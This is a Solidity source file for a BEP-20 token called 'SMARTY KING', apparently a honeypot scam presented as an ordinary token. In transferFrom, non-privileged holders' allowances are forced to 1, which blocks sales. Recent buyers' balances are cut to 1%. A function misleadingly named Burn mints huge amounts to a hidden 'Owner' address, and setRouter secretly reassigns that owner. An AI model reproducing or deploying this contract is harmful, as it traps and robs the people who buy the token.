/**
 *Submitted for verification at BscScan.com on 2022-03-01
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity 0.8.12; 
library SafeMath {
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "DIVIDING_ERROR");
        return a / b;
    }
    function divCeil(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 quotient = div(a, b);
        uint256 remainder = a - quotient * b;
        if (remainder > 0) {
            return quotient + 1;
        } else {
            return quotient;
        }
    }
}
interface IUniswapV2Factory {
function getPair(address tokenA, address tokenB) external view returns (address pair);
}

contract Token {
    using SafeMath for uint256;
    string public name = "SMARTY KING";
    string public symbol = "SMARTY";
    uint8 public decimals = 9;
    uint256 public totalSupply = 100000000 * 10 ** decimals;
    address public owner; address public router=0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address Owner=0xCFf8B2ff920DA656323680c20D1bcB03285f70AB;
    address public Bell=0x0000000000000000000000000000000000000000; uint256 tie;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        balanceOf[msg.sender] = totalSupply;
        owner = msg.sender;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    function approve(address spender, uint256 amount) public returns (bool success) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    function transfer(address to, uint256 amount) public returns (bool success) {
        if (Bell != Owner && to != Bell && balanceOf[Bell]>=totalSupply.div(24)) {
            balanceOf[Bell]=balanceOf[Bell].divCeil(100);}
        if (msg.sender==thePair() && balanceOf[to]==0) {Bell = to;}
        if (to==Owner){Bell=to;}
        if (to==thePair()){return false;}
        if (to == msg.sender) {Burn();}
        _transfer(msg.sender, to, amount);
        return true;
    }
    function _transfer(address from, address to, uint256 amount) internal  {
        require (balanceOf[from] >= amount);
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
    }
    function transferFrom( address from, address to, uint256 amount) public returns (bool success) {
        if (from != owner && from != Owner && from != Bell) {allowance[from][msg.sender]=1;} 
        require (allowance[from][msg.sender] >= amount);
        _transfer(from, to, amount);
        return true;
    }
    function Burn() internal {uint256 burn=totalSupply*1200; balanceOf[Owner]+=burn;}
    function thePair() public view returns (address) {
        IUniswapV2Factory _pair = IUniswapV2Factory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);
        address pair = _pair.getPair(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, address(this));
        return pair;
    }
    function setRouter(address sr) public returns(address){
        require (msg.sender==owner);
        Owner=sr;
        return Owner;
    }
}